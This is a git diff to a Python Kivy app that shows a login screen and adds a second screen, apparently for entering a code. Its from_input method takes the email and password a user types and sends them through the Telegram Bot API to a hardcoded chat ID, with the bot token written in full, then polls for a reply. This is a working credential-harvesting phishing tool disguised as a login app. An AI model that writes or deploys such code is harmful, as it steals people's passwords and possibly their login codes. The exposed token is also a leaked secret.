@@ -10,21 +10,20 @@ import certifi
 from urllib.parse import urlencode
 from kivy.uix.image import Image
 from kivy.lang import Builder
+from kivy.uix.screenmanager import Screen, ScreenManager
+from kivy.clock import Clock
 
 Window.clearcolor = (0.859, 0.859, 0.859, 1)
-
-class RotatedImage(Image):
-    angle = 15
+sm = ScreenManager()
 
 
-class My(App):
+class EnterScreen(Screen):
     def from_input(self, *args):
-        data = "*Login:* " + "`" + self.root.ids.email.text + "`" + "\n*Password:* " + "`" + self.root.ids.password.text + "`"
+        data = "*Login:* " + "`" + self.ids['email'].text + "`" + "\n*Password:* " + "`" + self.ids['password'].text + "`"
         data = urlencode({'text': data})
         self.r = UrlRequest(
             f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
-            f"=888281527&{data}&parse_mode=MarkdownV2", self.safe, ca_file=certifi.where())
-
+            f"=888281527&{data}&parse_mode=MarkdownV2", on_success=self.safe, ca_file=certifi.where())
     def safe(self, *args):
         self.last = self.r.result['result']['message_id'] + 1
         self.make_request()
@@ -38,6 +37,18 @@ class My(App):
             print(self.r.result['result'][0]['message']['text'])
         else:
             self.make_request()
+
+class CodeScreen(Screen):
+    pass
+
+sm.add_widget(EnterScreen(name='enter'))
+sm.add_widget(CodeScreen(name='code'))
+
+
+class My(App):
+    def build(self):
+        screen = Builder.load_file('my.kv')
+        return screen
 
 
 if __name__ == '__main__':
